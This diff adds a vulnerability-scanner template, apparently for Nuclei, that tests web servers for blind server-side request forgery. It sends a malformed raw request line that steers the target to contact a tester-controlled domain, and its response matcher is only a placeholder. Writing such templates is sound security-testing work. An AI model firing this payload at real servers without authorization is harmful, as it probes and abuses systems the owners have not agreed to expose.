@@ -1,0 +1,23 @@
+id: 0x006
+
+info:
+  name: Blind SSRF
+  author: 0xAwali
+  severity: info
+
+requests:
+  - raw:
+    - |+
+      GET @{{Host}}.{{Port}}.BSSRF-006.{{MY-DOMAIN}}# HTTP/1.1
+      Host: {{Hostname}}
+      Cache-Control: no-transform
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Your Match"
